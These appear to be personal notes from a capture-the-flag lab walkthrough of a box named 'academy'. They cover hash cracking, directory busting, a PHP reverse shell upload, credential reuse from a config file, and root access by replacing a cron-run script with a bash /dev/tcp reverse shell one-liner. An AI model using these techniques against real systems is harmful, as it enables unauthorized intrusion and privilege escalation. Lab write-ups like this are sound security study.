- to know ip of box
	- `dhclient`
	- `ip a`

ports : 21/tcp ftp, 22/tcp ssh, 80/tcp http
ftp :
-  note.txt present
	use `get [filename]` to transfer file 
	username : 10201321

- use `hash-identifier` to crack hashes
- used [[Hashcat]] to crack
	- password is *student*
- used [[ffuf]] to dir bust 
	- found 192.168.60.6/academy 192.168.60.6/phpmyadmin

- uploaded a php reverse shell script link and gained assess as `www-data`
- used [[linpeas#linpeas|linpeas]] to search for any priv escalation
	- found * * * * * /home/grimmie/backup.sh
	-  /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
- from `cat /etc/passwd` we find grimmie is a user and admin
- `ssh grimmie@192.168.60.6`   with `My_V3ryS3cur3_P4ss`
	- got access of grimmie@academy
	- but still no sudo access `sudo -l`
	- check `history`
	- try running linpeas again to check if anything has changed
	- `ls` gives backup.sh
	- crontab is used run services/script periodically
		- check `crontab -l` : no crontab for grimmie
		- check `crontab -u root -l`
		- check `crontab -e`
		- `systemctl list-timers`
		- used [[pspy]] to confirm 
			- we find backup.sh runs periodically
- we can exploit this by using a *bash reverse shell one liner*
	- -> `bash -i >& /dev/tcp/[host ip]/[port] 0>&1
			- 192.168.60.4/8081
	- replace backup.sh with this code
	- setup nc listener on `[port]` on host machine
- *SUCCESS* 
	- root@academy achieved 
	- found flag.txt